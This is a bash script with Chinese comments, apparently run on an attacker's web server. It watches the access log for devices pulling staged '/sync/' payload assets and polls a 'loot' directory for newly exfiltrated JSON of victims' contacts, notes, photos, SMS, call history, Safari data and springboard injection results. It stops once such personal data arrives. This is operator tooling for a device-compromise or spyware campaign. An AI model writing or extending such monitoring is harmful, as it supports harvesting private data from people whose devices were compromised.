#!/bin/bash
# P1OFF 测试盯梢：springboard / contacts / notes / photo / /sync 请求
LOG=/www/wwwlogs/i.131422.com.log
L=/www/wwwroot/i.131422.com/loot
SEEN=/tmp/hg_off_seen.txt
HIT=/tmp/hg_off_hit
: > "$SEEN"; rm -f "$HIT"
OFF=$(stat -c%s "$LOG")
END=$(( $(date +%s) + 3600 ))
echo "[$(date -u +%T)] P1OFF watcher start (60min cap)"
while [ "$(date +%s)" -lt "$END" ]; do
  NOW=$(stat -c%s "$LOG")
  if [ "$NOW" -gt "$OFF" ]; then
    tail -c +$((OFF+1)) "$LOG" > /tmp/hg_off_new.log; OFF=$NOW
    grep -a "/sync/" /tmp/hg_off_new.log | grep -aE "swap-ritual|short_thing|wallet1[0-9]|wallet0[1-9]|core_a5|aware_retreat|future-destroy" \
      | grep -av "^127.0.0.1" | awk '{print $1,$4,$7,$9,$10}' | sed 's/\[//' >> /tmp/hg_off_sync.txt
    grep -a "sync/daily.html" /tmp/hg_off_new.log | grep -av "^127.0.0.1" \
      | awk '{print $1,$4,$7,$9,$10}' | sed 's/\[//' >> /tmp/hg_off_daily.txt
  fi
  SINCE="$(date -u -d '-120 seconds' '+%Y-%m-%d %H:%M:%S')"
  find "$L" -name '*.json' ! -name '*.meta.json' -newermt "$SINCE" 2>/dev/null > /tmp/hg_off_loot.txt
  while IFS= read -r f; do
    grep -q 'plugin_batch_done\|contacts_\|notes_\|photo_\|injection_\|sms_\|call_\|safari_' "$f" 2>/dev/null || continue
    grep -qF "$f" "$SEEN" 2>/dev/null && continue
    echo "$f" >> "$SEEN"
    python3 - "$f" <<'PY'
import json, sys, os, datetime
try: d = json.load(open(sys.argv[1]))
except Exception: sys.exit()
print('[%s] %-14s %-30s dev=%-12s os=%-6s total=%s ent=%s ok=%s sb=%s fail_kind=%s bundle=%s' % (
  datetime.datetime.utcfromtimestamp(os.path.getmtime(sys.argv[1])).strftime('%H:%M:%S'),
  sys.argv[1].split('/')[-2][:14], str(d.get('et'))[:30], str(d.get('device')), str(d.get('pv')),
  d.get('total'), d.get('entries'), d.get('ok'), d.get('springboard'), d.get('fail_kind'),
  str(d.get('bundleId'))[:24]))
PY
    case "$(basename "$f")" in
      *contacts*|*notes*|*photo*|*sms*) echo hit >> "$HIT" ;;
    esac
    if grep -q 'plugin_batch_done' "$f" 2>/dev/null && grep -qE '"springboard": *[1-9]' "$f" 2>/dev/null; then
      echo "SPRINGBOARD_HIT" >> "$HIT"
    fi
  done < /tmp/hg_off_loot.txt
  [ -s "$HIT" ] && { echo "[$(date -u +%T)] 命中"; break; }
  sleep 20
done
echo "=== P1OFF watcher 结束 $(date -u +%T) ==="
echo "--- 设备拉 /sync 资产 ---"; tail -25 /tmp/hg_off_sync.txt 2>/dev/null
echo "--- 设备拉 daily.html ---"; tail -10 /tmp/hg_off_daily.txt 2>/dev/null
echo "--- 新事件 ---"; while IFS= read -r f; do basename "$f"; done < "$SEEN"
